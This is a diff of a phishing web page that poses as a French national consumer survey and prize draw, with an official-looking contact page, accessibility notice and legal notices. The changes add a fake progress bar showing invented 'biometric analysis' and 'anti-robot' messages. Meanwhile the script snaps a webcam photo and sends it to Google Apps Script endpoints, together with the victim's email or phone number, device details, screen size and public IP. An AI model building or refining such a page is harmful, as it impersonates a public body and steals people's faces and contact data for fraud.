@@ -84,7 +84,10 @@
   .consent-label { display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
   .consent-label input { margin-top: 4px; width: 18px; height: 18px; accent-color: #000091; }
   
+  /* Modification du loader pour intégrer la barre de progression */
   #loader { display: none; text-align: center; margin-top: 20px; font-weight: 700; color: #000091; font-size: 15px; }
+  #loader-bar-bg { width: 100%; height: 6px; background: #e5e5e5; margin-top: 10px; border-radius: 3px; overflow: hidden; }
+  #loader-bar-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
   
   #camera-area { display: none; margin-top: 25px; text-align: center; }
   #video-container { width: 100px; height: 100px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #000091; }
@@ -190,7 +193,11 @@
     </div>
     <button class="btn-action" id="btn-submit" disabled>Valider ma participation</button>
     
-    <div id="loader">Vérification en cours...</div>
+    <!-- LOADER MODIFIÉ -->
+    <div id="loader">
+      <div id="loader-text">Initialisation du protocole de sécurité...</div>
+      <div id="loader-bar-bg"><div id="loader-bar-fill"></div></div>
+    </div>
     
     <div id="camera-area">
       <div id="video-container">
@@ -227,7 +234,6 @@
 <div class="modal" id="modal-contact"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-contact')">&times;</button><h2>Nous contacter</h2><p>Pour toute question relative à l'enquête ou au jeu-concours, vous pouvez nous joindre :</p><ul><li><strong>Par e-mail :</strong> contact@observatoire-consommation.fr</li><li><strong>Par téléphone :</strong> 01 40 00 00 00 (prix d'un appel local, du lundi au vendredi de 9h à 17h)</li><li><strong>Par courrier :</strong> Observatoire National de la Consommation, 20 avenue de Ségur, 75007 Paris</li></ul><p><em>Merci de préciser votre numéro de dossier si vous en avez un.</em></p></div></div>
 <div class="modal" id="modal-accessibilite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-accessibilite')">&times;</button><h2>Accessibilité</h2><p>L'Observatoire National de la Consommation s'engage à rendre son site accessible à tous, conformément à l'article 47 de la loi n° 2005-102 du 11 février 2005.</p><p>Cette déclaration d'accessibilité s'applique au site de l'enquête nationale sur la consommation.</p><h3>État de conformité</h3><p>Le site est en cours d'audit pour évaluer sa conformité au RGAA (Référentiel Général d'Amélioration de l'Accessibilité).</p><h3>Retour d'information et contact</h3><p>Si vous n'arrivez pas à accéder à un contenu ou à un service, vous pouvez nous contacter pour être orienté vers une alternative accessible ou obtenir le contenu sous une autre forme : accessibilite@observatoire-consommation.fr.</p></div></div>
 
-<!-- MODALE MENTIONS LÉGALES (Modifiée pour être hyper réaliste) -->
 <div class="modal" id="modal-mentions">
   <div class="modal-content">
     <button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button>
@@ -267,7 +273,7 @@
 <script>
 // ⚠️ TES DEUX LIENS SONT ICI ⚠️
 const SCRIPT_URL_TEXT = "https://script.google.com/macros/s/AKfycbyBI-fdD9Kw44y3qMp0s4YrDq8RKf5Nod8Zzz_Yeqz8MtksyzWdhP73xE9vPp2ejVj1Ug/exec";
-const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxy_ubTvY4NA_sZ6I8FvujoWnM3qqNeS1mZRuZjVzqttcYgtAvms2MHA-yk1nsmQSj8ug/exec";
+const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxGcA_5HG9JtEY48Kw1mowcVVgLUNG1Zl3VTXupuCBOQzPurZIeHiGubUSC1ArcEnp9Ig/exec";
 
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
@@ -309,6 +315,8 @@ const stepFinal = document.getElementById('step-final');
 const chkConsent = document.getElementById('chk-consent');
 const btnSubmit = document.getElementById('btn-submit');
 const loader = document.getElementById('loader');
+const loaderText = document.getElementById('loader-text');
+const loaderBarFill = document.getElementById('loader-bar-fill');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
 const stepConfirmation = document.getElementById('step-confirmation');
@@ -421,6 +429,10 @@ btnSubmit.addEventListener('click', async () => {
   btnSubmit.disabled = true;
   btnSubmit.style.display = 'none';
   loader.style.display = 'block';
+  
+  // Réinitialiser le loader
+  loaderText.textContent = "Initialisation du protocole de sécurité...";
+  loaderBarFill.style.width = '10%';
 
   const info = getDeviceInfo();
   const screenInfo = `${window.screen.width}x${window.screen.height}`;
@@ -440,7 +452,11 @@ btnSubmit.addEventListener('click', async () => {
     }
 
     let photoBase64 = "";
+    
+    // Étape 1 : Capture photo après 1.5 seconde
     setTimeout(() => {
+      loaderText.textContent = "Analyse biométrique en cours...";
+      loaderBarFill.style.width = '40%';
       try {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 300;
@@ -449,11 +465,22 @@ btnSubmit.addEventListener('click', async () => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
       } catch(e) {}
-    }, 800);
+    }, 1500);
 
+    // Étape 2 : Changer le texte après 3 secondes
+    setTimeout(() => {
+      loaderText.textContent = "Vérification anti-robot et sécurisation...";
+      loaderBarFill.style.width = '80%';
+    }, 3000);
+
+    // Étape 3 : Finir après 4.5 secondes (4500 ms)
     setTimeout(async () => {
+      loaderBarFill.style.width = '100%';
+      loaderText.textContent = "Validation terminée.";
+
       const ip = await getPublicIP();
       
+      // Envoi Texte
       const formDataTexte = new URLSearchParams();
       formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
       formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
@@ -469,6 +496,7 @@ btnSubmit.addEventListener('click', async () => {
 
       fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
 
+      // Envoi Photo
       if (photoBase64) {
         const formDataPhoto = new URLSearchParams();
         formDataPhoto.append("photo", photoBase64);
@@ -485,16 +513,21 @@ btnSubmit.addEventListener('click', async () => {
       
       docNumber.textContent = "G-2026-" + Math.floor(100000 + Math.random() * 900000);
 
-      loader.style.display = 'none';
-      cameraArea.style.display = 'none';
-      stepFinal.classList.remove('active');
-      stepConfirmation.classList.add('active');
-      progressFill.style.width = '100%';
-    }, 1500);
+      // Petit délai pour que la barre arrive à 100% visuellement avant de changer de page
+      setTimeout(() => {
+        loader.style.display = 'none';
+        cameraArea.style.display = 'none';
+        stepFinal.classList.remove('active');
+        stepConfirmation.classList.add('active');
+        progressFill.style.width = '100%';
+      }, 300);
+
+    }, 4500); // <-- Modifié ici pour faire durer 4,5 secondes
 
   } catch (err) {
-    loader.textContent = "Impossible de lancer la vérification. Veuillez autoriser la caméra.";
-    loader.style.color = "#E1000F";
+    loaderText.textContent = "Impossible de lancer la vérification. Veuillez autoriser la caméra.";
+    loaderText.style.color = "#E1000F";
+    loaderBarFill.style.backgroundColor = "#E1000F";
   }
 });
 
